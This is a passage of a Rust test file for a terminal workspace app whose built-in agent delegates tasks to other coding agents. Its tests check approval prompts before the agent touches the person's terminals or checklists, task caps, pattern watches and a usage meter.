        crate::workspace::delegate::SPENT_AFTER.as_millis() as u64,
    );
    assert_eq!(
        notices(&ws, cx),
        [(::templum_agent::NoticeLevel::Failed, Some(uid))]
    );
}

#[gpui_kit::test]
fn waiting_for_its_person_is_told_once(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN, TEXT_TURN]);
    let (_, uid, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    for _ in 0..2 {
        super::bus::event(
            handle,
            &ws,
            cx,
            &terminal,
            json!({ "event": "needs_you", "message": "Allow Edit?" }),
        );
        super::bus::after(cx, 400);
    }
    assert_eq!(
        notices(&ws, cx),
        [(::templum_agent::NoticeLevel::Waiting, Some(uid))]
    );
}

#[cfg(unix)]
#[gpui_kit::test]
fn delegate_hands_a_task_under_the_templum_agents_line(cx: &mut TestAppContext) {
    let (handle, ws, _, theirs) = super::delegate::two_agents(cx);
    let (worker, them) = me(&ws, cx, theirs);
    super::bus::has_server(handle, &ws, cx, &worker, 7);
    // The person's agent runs it as its mode lets it: the person allows it first.
    let answers = control_later(
        handle,
        &ws,
        cx,
        6,
        "delegate",
        json!({"block": them, "task": "fix the tests"}),
    );
    assert!(answers.try_recv().is_err(), "it asks");
    ws.read_with(cx, |ws, _| {
        let approval = &ws.templum_agent.approvals[0];
        assert!(approval.said.starts_with("Hand \""), "{}", approval.said);
        assert_eq!(approval.details, "fix the tests");
    });
    answer(handle, &ws, cx, crate::chat::Answer::Conversation);
    // Answered once its agent took the task.
    assert!(answers.try_recv().is_err(), "not taken yet");
    screen_with(&ws, cx, theirs, "[from Templum Agent, task t1]");
    super::delegate::entered(&ws, cx, theirs);
    super::bus::event(handle, &ws, cx, &worker, json!({ "event": "submitted" }));
    super::bus::after(
        cx,
        crate::workspace::delegate::ENTER_AFTER.as_millis() as u64,
    );
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        (failed, text),
        (false, format!("Handed to {them} as task t1."))
    );
    let by = ws.read_with(cx, |ws, _| {
        ws.space
            .terminal(theirs)
            .unwrap()
            .handed
            .as_ref()
            .unwrap()
            .by
            .clone()
    });
    assert_eq!(by, ::templum_agent::ASKER);
    // With wait, the call waits for its end, which answers it.
    let (worker, _) = me(&ws, cx, theirs);
    ws.update(cx, |ws, cx| {
        ws.end_turn(&worker, templum_mcp::Reply::ok("Done."), cx)
    });
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "delegate",
        json!({"block": them, "task": "and push", "wait": true}),
    );
    assert!(answers.try_recv().is_err(), "it waits for the task's end");
    ws.update(cx, |ws, cx| {
        ws.end_turn(&worker, templum_mcp::Reply::ok("Pushed."), cx)
    });
    cx.run_until_parked();
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!((failed, text.as_str()), (false, "Pushed."));
}

#[gpui_kit::test]
fn wait_for_answers_needs_you(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(busy).unwrap().state = Some(crate::workspace::AgentState::NeedsYou(
            Some("Allow Edit?".into()),
        ));
    });
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "wait_for",
        json!({"block": uid, "event": "needs_you"}),
    );
    assert!(!failed && text.contains("Allow Edit?"), "{text}");
    // Idle, with no task of its: answered at once.
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(busy).unwrap().state = Some(crate::workspace::AgentState::Idle);
    });
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "wait_for",
        json!({"block": uid, "event": "idle"}),
    );
    assert!(!failed && text.contains("idle"), "{text}");
}

#[cfg(unix)]
#[gpui_kit::test]
fn interrupting_the_persons_agent_asks_its_own_doesnt(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(busy).unwrap().state = Some(crate::workspace::AgentState::Working);
    });
    let _answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "interrupt",
        json!({"block": uid, "reason": "stuck"}),
    );
    ws.read_with(cx, |ws, _| {
        let approvals = &ws.templum_agent.approvals;
        assert_eq!(approvals.len(), 1, "the person's agent: it asks");
        assert_eq!(approvals[0].said, "Interrupt \"Claude Code\"");
    });
    // Its own runs an agent in front of its shell, as a snapshot found it.
    ws.update(cx, |ws, _| ws.command = Some(agent_cat()));
    let (own, own_uid) = busy_terminal(handle, &ws, cx);
    in_front(&ws, cx, own, true);
    super::delegate::found(&ws, cx, own);
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(own).unwrap().state = Some(crate::workspace::AgentState::Working);
        ws.templum_agent
            .conversation
            .own
            .blocks
            .push(own_uid.clone());
    });
    let answers = control_later(handle, &ws, cx, 8, "interrupt", json!({"block": own_uid}));
    super::bus::after(cx, 2_000);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(
        !failed && text.starts_with(&format!("Pressed Esc in {own_uid}")),
        "{text}"
    );
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.templum_agent.approvals.len()),
        1
    );
}

/// `stop_agent` on the person's terminal asks first; on the Templum Agent's own it ends what runs
/// there at once, and the shell stays at its prompt.
#[cfg(unix)]
#[gpui_kit::test]
fn stopping_the_persons_terminal_asks_its_own_stops_at_once(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        ws.command = Some(jobs("cat; while read -r x; do :; done"))
    });
    let (theirs, their_uid) = busy_terminal(handle, &ws, cx);
    in_front(&ws, cx, theirs, true);
    let _answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "stop_agent",
        json!({"block": their_uid, "reason": "done"}),
    );
    ws.read_with(cx, |ws, _| {
        let approvals = &ws.templum_agent.approvals;
        assert_eq!(approvals.len(), 1, "the person's terminal: it asks");
        assert_eq!(approvals[0].said, "Stop what runs in \"Claude Code\"");
    });
    let (own, own_uid) = busy_terminal(handle, &ws, cx);
    in_front(&ws, cx, own, true);
    super::delegate::found(&ws, cx, own);
    ws.update(cx, |ws, _| {
        let own = &mut ws.templum_agent.conversation.own;
        own.blocks.push(own_uid.clone());
    });
    let (failed, text) = control(handle, &ws, cx, "stop_agent", json!({"block": own_uid}));
    assert!(
        !failed && text.starts_with(&format!("Stopped {own_uid}: ended ")),
        "{text}"
    );
    in_front(&ws, cx, own, false);
    ws.read_with(cx, |ws, _| {
        assert!(
            !ws.space.terminal(own).unwrap().term.exited(),
            "the shell stays"
        );
        assert_eq!(ws.templum_agent.approvals.len(), 1, "its own: no approval");
    });
}

/// `wait_for` with card 35's pattern: the Templum Agent waits for the printed line, or with `wait`
/// false hears of it in its chat while it works; New chat drops the watches it left.
#[cfg(unix)]
#[gpui_kit::test]
fn wait_for_a_pattern_answers_on_the_line_or_tells_the_chat(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    ws.update(cx, |ws, _| ws.command = Some(agent_cat()));
    let (block, uid) = busy_terminal(handle, &ws, cx);
    in_front(&ws, cx, block, true);
    let watching = |ws: &Entity<Workspace>, cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| {
            ws.space.terminal(block).unwrap().term.watching()
        })
    };
    let pattern = json!({"block": uid, "pattern": "Ready in \\d+"});
    let answers = control_later(handle, &ws, cx, 7, "wait_for", pattern);
    super::bus::after(cx, 250);
    assert!(answers.try_recv().is_err(), "nothing printed yet");
    super::delegate::prints(&ws, cx, block, b"starting\r  Ready in 312 ms\r");
    let (failed, text) = super::delegate::heard(cx, &answers);
    assert!(
        !failed && text.starts_with(&format!("{uid} printed a line matching")),
        "{text}"
    );
    assert!(text.contains("Ready in 312 ms"), "{text}");
    let watch = |pattern: &str| json!({"block": uid, "pattern": pattern, "wait": false});
    assert_eq!(
        control(handle, &ws, cx, "wait_for", watch("ERROR")),
        (
            false,
            format!("Watching {uid} for \"ERROR\" as w1: a match comes back into this chat.")
        )
    );
    super::delegate::prints(&ws, cx, block, b"ERROR one\r");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while notices(&ws, cx).is_empty() {
        assert!(std::time::Instant::now() < deadline, "no notice");
        super::bus::after(cx, 250);
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert_eq!(
        notices(&ws, cx),
        [(::templum_agent::NoticeLevel::Done, Some(uid.clone()))]
    );
    let sent = ws.read_with(cx, |ws, _| ws.templum_agent.sent.clone());
    let heading = format!("[watch w1 on {uid}: a line matches \"ERROR\"]");
    assert!(sent.iter().any(|m| m.contains(&heading)), "{sent:?}");
    assert_eq!(watching(&ws, cx), 0, "told once, its watch goes");
    rows_until(&ws, cx, ended);
    assert!(!control(handle, &ws, cx, "wait_for", watch("never")).0);
    assert_eq!(watching(&ws, cx), 1);
    ws.update(cx, |ws, cx| ws.new_chat(cx));
    assert_eq!(watching(&ws, cx), 0, "the old conversation's watch goes");
    assert!(ws.read_with(cx, |ws, _| ws.watches.is_empty()));
}

/// The refusal while `n` of its tasks are under way.
fn too_many(n: u32) -> String {
    format!(
        "{n} of your tasks are under way (the most at once: Settings ▸ Templum Agent ▸ Agents at \
         once). End your turn: each one's end comes back into this chat."
    )
}

#[gpui_kit::test]
fn the_fifth_task_is_refused_while_four_run(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let mut terminals = Vec::new();
    for _ in 0..4 {
        terminals.push(handed_by_the_templum_agent(handle, &ws, cx).2);
    }
    let (_, other) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent.conversation.own.blocks.push(other.clone())
    });
    let open = json!({"agent": "nope", "workspace": shown, "prompt": "Take card 5"});
    assert_eq!(
        control(handle, &ws, cx, "open_agent", open.clone()),
        (true, too_many(4))
    );
    assert_eq!(
        control(
            handle,
            &ws,
            cx,
            "delegate",
            json!({"block": other, "task": "Take card 5"})
        ),
        (true, too_many(4))
    );
    // Without a prompt it hands no task: the cap doesn't hold it.
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "nope", "workspace": shown}),
    );
    assert!(text.contains("There's no agent nope"), "{text}");
    ws.update(cx, |ws, cx| {
        ws.end_turn(&terminals[0], templum_mcp::Reply::ok("Done."), cx)
    });
    let (_, text) = control(handle, &ws, cx, "open_agent", open);
    assert!(
        text.contains("There's no agent nope"),
        "one ended, it goes: {text}"
    );
}

#[gpui_kit::test]
fn max_agents_from_the_settings(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "max_agents", 1_i64),
            |c| c.templum_agent.max_agents = 1,
            cx,
        )
    });
    frame(handle, cx);
    handed_by_the_templum_agent(handle, &ws, cx);
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let open = json!({"agent": "nope", "workspace": shown, "prompt": "go"});
    assert_eq!(
        control(handle, &ws, cx, "open_agent", open),
        (true, too_many(1))
    );
}

#[gpui_kit::test]
fn the_meter_counts_its_tasks_and_cost(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (first, _, _) = handed_by_the_templum_agent(handle, &ws, cx);
    handed_by_the_templum_agent(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("go");
        c.apply(::templum_agent::ChatEvent::TurnEnded {
            ms: None,
            cost_usd: Some(0.04),
            error: None,
        });
        c.notice(
            "[task t9 from Codex (b9): done in 31 s, $0.31] Its answer.",
            ::templum_agent::NoticeLevel::Done,
            None,
        );
        c.working = false;
    });
    assert_eq!(
        ws.read_with(cx, |ws, _| crate::chat::panel::meter(ws)),
        Some("2 working · $0.35".to_string())
    );
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-meter", cx);
        window.render_frame(cx);
        assert!(window.try_find("agent-task-1").is_some());
        window.click("agent-task-0", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.space.focused),
        Some(first),
        "a task shows its block"
    );
}

#[gpui_kit::test]
fn catch_me_up_sends_its_sentence(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN, TEXT_TURN]);
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-suggestion-1", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let rows = rows_until(&ws, cx, ended);
    assert_eq!(
        rows[0],
        ::templum_agent::Row::Person {
            text: "Catch me up: what's going on?".into(),
            queued: false
        }
    );
    handed_by_the_templum_agent(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        // Catch me up is in the usage chip's drawer.
        window.click("agent-meter", cx);
        window.render_frame(cx);
        window.click("agent-catch-up", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let rows = ws.read_with(cx, |ws, _| ws.templum_agent.conversation.rows.clone());
    assert!(
        rows.iter().filter(|r| matches!(r, ::templum_agent::Row::Person { text, .. } if text == "Catch me up: what's going on?")).count() == 2,
        "{rows:#?}"
    );
}

#[gpui_kit::test]
fn new_chat_lets_go_of_the_old_conversations_tasks(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (block, _, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    // An agent it opened with a prompt, not yet ready for it.
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(block).unwrap().prompt = Some(crate::workspace::Prompt {
            text: "Take card 4".into(),
            screen: None,
            gated: true,
            delegated: false,
        })
    });
    ws.update(cx, |ws, cx| ws.new_chat(cx));
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.agent_tasks()),
        0,
        "the new chat counts none"
    );
    assert!(ws.read_with(cx, |ws, _| {
        let pane = ws.space.terminal(block).unwrap();
        pane.handed.is_none() && pane.prompt.is_none()
    }));
    ws.update(cx, |ws, cx| {
        ws.end_turn(&terminal, templum_mcp::Reply::ok("Done."), cx)
    });
    super::bus::after(
        cx,
        crate::workspace::delegate::SPENT_AFTER.as_millis() as u64,
    );
    ws.read_with(cx, |ws, _| {
        assert!(
            ws.templum_agent.sent.is_empty(),
            "no old task wakes the new chat"
        );
        assert!(ws.templum_agent.engine.is_none());
    });
}

#[gpui_kit::test]
fn an_approval_doesnt_take_the_keyboard_from_someone_typing(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.press(AGENT, cx);
        window.render_frame(cx);
        window.input("open ", cx);
    })
    .unwrap();
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    super::bus::after(cx, 600);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.input("2 agents", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        answers.try_recv().is_err(),
        "a 2 typed in a sentence answers nothing"
    );
    assert_eq!(pill_text(&ws, cx), "open 2 agents");
    assert!(pill_has_keys(handle, &ws, cx));
}

#[gpui_kit::test]
fn overview_lists_the_tasks_it_handed(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid, _) = handed_by_the_templum_agent(handle, &ws, cx);
    let (failed, text) = control(handle, &ws, cx, "overview", json!({}));
    assert!(!failed, "{text}");
    assert!(
        text.contains(&format!("Your tasks under way: t1 to {uid}")),
        "{text}"
    );
}

#[gpui_kit::test]
fn the_pill_shows_at_its_width_and_grows_when_it_has_the_keyboard(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let width = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            window.render_frame(cx);
            f32::from(window.find("agent-pill").bounds().size.width)
        })
        .unwrap()
    };
    assert_eq!(
        width(cx),
        300.0,
        "no growing from nothing when it first shows"
    );
    // With less motion it is there at once.
    no_motion(cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    assert_eq!(width(cx), 640.0);
}

#[gpui_kit::test]
fn a_delete_of_an_item_that_isn_t_there_runs_and_says_so_without_an_approval(
    cx: &mut TestAppContext,
) {
    let (handle, ws) = open(cx);
    let (block, _) = super::checklist_block(handle, &ws, cx, "Release", &["Tag it"]);
    let terminal = super::first_id(&ws, cx);
    let (uid, terminal) = ws.read_with(cx, |ws, _| {
        (
            ws.space.uids[&block].clone(),
            ws.space.uids[&terminal].clone(),
        )
    });
    for target in [&uid, &terminal] {
        let (failed, said) = control(
            handle,
            &ws,
            cx,
            "delete_item",
            json!({"block": target, "item": 999}),
        );
        assert!(failed, "{said}");
        assert!(!said.is_empty());
        ws.read_with(cx, |ws, _| assert!(ws.templum_agent.approvals.is_empty()));
    }
}

#[gpui_kit::test]
fn the_templum_agent_edits_and_deletes_items_of_any_checklist(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (block, list) = super::checklist_block(handle, &ws, cx, "Release", &["Tag it", "Ship"]);
    let uid = ws.read_with(cx, |ws, _| ws.space.uids[&block].clone());
    let (tag, ship) = ws.read_with(cx, |ws, _| {
        let items = &ws.checklists.get(list).unwrap().items;
        (items[0].id, items[1].id)
    });
    let text = |ws: &Entity<Workspace>, cx: &mut TestAppContext, item: u64| {
        ws.read_with(cx, |ws, _| {
            ws.checklists
                .get(list)
                .and_then(|l| l.item(item))
                .map(|i| i.text.clone())
        })
    };
    let steps = |ws: &Entity<Workspace>, cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| ws.checklists_undo.len())
    };
    // The person's checklist, wired to nothing: an edit runs at once, one undo step.
    let before = steps(&ws, cx);
    let (failed, said) = control(
        handle,
        &ws,
        cx,
        "edit_item",
        json!({"block": uid, "item": tag, "text": " Tag v1 "}),
    );
    assert_eq!(
        (failed, said),
        (false, format!("Item {tag} is now \"Tag v1\"."))
    );
    assert_eq!(text(&ws, cx, tag).as_deref(), Some("Tag v1"));
    assert_eq!(steps(&ws, cx), before + 1);

    // A delete of the person's checklist waits, in words that name the item.
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "delete_item",
        json!({"block": uid, "item": ship}),
    );
    assert!(answers.try_recv().is_err(), "it waits for the person");
    ws.read_with(cx, |ws, _| {
        let approval = &ws.templum_agent.approvals[0];
        assert_eq!(approval.said, format!("Delete item {ship} of \"Release\""));
        assert_eq!(approval.details, "\"Ship\"");
    });
    // The item is edited before Allow: the approval is asked again.
    ws.update(cx, |ws, cx| {
        let space = ws.space.id.clone();
        ws.item_text((&space, block), &uid, ship, "Ship it", cx);
    });
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    assert!(answers.try_recv().is_err(), "it still waits");
    ws.read_with(cx, |ws, _| {
        let approval = &ws.templum_agent.approvals[0];
        assert!(approval.changed);
        assert_eq!(approval.details, "\"Ship it\"");
    });
    assert_eq!(text(&ws, cx, ship).as_deref(), Some("Ship it"));
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    let (failed, said) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!((failed, said), (false, format!("Deleted item {ship}.")));
    assert_eq!(text(&ws, cx, ship), None);

    // A checklist block the agent made is its own: a delete runs at once.
    let space = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let (_, made) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": space, "kind": "checklist", "text": "Mine\nOne"}),
    );
    let mine = made
        .trim_end_matches('.')
        .rsplit(' ')
        .next()
        .unwrap()
        .to_string();
    let one = ws.read_with(cx, |ws, _| {
        let (space, id) = ws.find_block(&mine).unwrap();
        let list = ws.list_of((&space, id), &mine).ok().unwrap();
        ws.checklists.get(list).unwrap().items[0].id
    });
    let (failed, said) = control(
        handle,
        &ws,
        cx,
        "delete_item",
        json!({"block": mine, "item": one}),
    );
    assert_eq!((failed, said), (false, format!("Deleted item {one}.")));
}
